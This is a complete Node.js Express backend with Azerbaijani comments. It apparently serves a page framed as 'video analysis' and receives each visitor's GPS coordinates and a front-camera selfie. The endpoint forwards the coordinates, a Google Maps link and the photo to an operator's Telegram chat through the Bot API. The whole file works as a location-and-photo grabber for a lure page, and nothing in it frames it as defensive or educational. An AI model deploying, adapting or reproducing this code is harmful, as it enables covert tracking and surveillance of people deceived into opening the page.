const express = require('express');
const path = require('path');
const fetch = require('node-fetch'); // Node.js 18+ istifadə edirsinizsə bu sətirə ehtiyac olmaya bilər
require('dotenv').config(); // Environment variables üçün dotenv

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json({ limit: '50mb' })); // Gələn JSON məlumatını işləmək üçün (şəkil üçün limit artırıldı)
app.use(express.static(path.join(__dirname, 'public'))); // `public` qovluğunu statik fayllar üçün təyin edin

// TƏHLÜKƏSİZLİK QEYDİ: Bu məlumatlar .env faylında saxlanmalıdır!
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; // Bot token
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;     // Məlumatların göndəriləcəyi chat ID

// Frontenddən gələn məlumatları qəbul edən API endpoint
app.post('/api/send-data', async (req, res) => {
    const { videoUrl, location, image } = req.body;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error("Telegram bot token və ya chat ID təyin edilməyib.");
        return res.status(500).json({ message: "Server konfiqurasiya xətası." });
    }

    try {
        let messageText = `⚡️ *Yeni Video Analiz Girişi!* ⚡️\n\n`;
        messageText += `*Video URL:* ${videoUrl || 'Təyin edilməyib'}\n`;

        if (location) {
            messageText += `*Lokasiya:* [Google Maps-də Gör] (https://www.google.com/maps?q=${location.latitude},${location.longitude})\n`;
            messageText += `  Enlem: ${location.latitude}\n`;
            messageText += `  Boylam: ${location.longitude}\n`;
            messageText += `  Dəqiqlik: ${location.accuracy ? location.accuracy + ' metr' : 'Təyin edilməyib'}\n`;
        } else {
            messageText += `*Lokasiya:* İstifadəçi tərəfindən rədd edildi və ya əldə edilmədi.\n`;
        }

        // Telegrama mətn mesajı göndər
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown'
            })
        });

        // Əgər şəkil varsa, şəkli Telegrama göndər
        if (image) {
            // Base64 formatlı şəkli göndərmək üçün metod
            // Telegram API `sendPhoto` metodu file_id, URL və ya Multipart Form Data qəbul edir.
            // Base64-ü birbaşa göndərə bilmədiyi üçün onu bir "file" kimi simulyasiya etməliyik.
            // Bu, daha mürəkkəbdir və `form-data` kimi kitabxanaya ehtiyac ola bilər.
            // Sadəlik üçün, Base64-ü müvəqqəti fayl kimi işləməyəcəyik,
            // bunun əvəzinə, bəzi metodlar Base64-dən URL yaratmağa imkan verir (amma bu real şəkil yükləmək deyil).
            // Ən yaxşı yol: Base64-ü diskə yazın (Render-də bu müvəqqəti olacaq) və ya bir bulud xidmətinə yükləyin.
            // Alternativ olaraq, sadəcə Base64 stringini mesaj olaraq göndərmək olar, amma bu vizual deyil.

            // Ən sadə yanaşma (Şəkli URL olaraq göndərmək, bu Base64 üçün işləməyəcək!)
            // və ya Base64 stringini bir mesaj olaraq göndərmək:
            
            // fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            //     method: 'POST',
            //     headers: { 'Content-Type': 'application/json' },
            //     body: JSON.stringify({
            //         chat_id: TELEGRAM_CHAT_ID,
            //         photo: image // Bu, əksər hallarda işləməyəcək, Telegram Base64-ü birbaşa qəbul etmir
            //     })
            // });

            // Base64 şəkli Telegrama göndərməyin daha etibarlı yolu:
            // 1. Base64-ü buffer-ə çevirmək.
            // 2. FormData ilə `sendPhoto` metoduna göndərmək.
            const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
            const imageBuffer = Buffer.from(base64Data, 'base64');

            const FormData = require('form-data');
            const form = new FormData();
            form.append('chat_id', TELEGRAM_CHAT_ID);
            form.append('photo', imageBuffer, { filename: 'selfie.jpg', contentType: 'image/jpeg' });
            form.append('caption', 'İstifadəçinin ön kamera görüntüsü');

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: form,
                headers: form.getHeaders() // FormData üçün xüsusi başlıqlar lazımdır
            });
            console.log("Kamera görüntüsü Telegrama göndərildi.");

        }

        res.status(200).json({ message: "Məlumatlar uğurla qəbul edildi və Telegrama göndərildi." });

    } catch (error) {
        console.error("Məlumatları Telegrama göndərərkən xəta baş verdi:", error);
        res.status(500).json({ message: "Məlumatları emal edərkən daxili server xətası." });
    }
});

// Bütün digər sorğular üçün index.html-i qaytar
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server ${PORT} portunda işləyir.`);
});
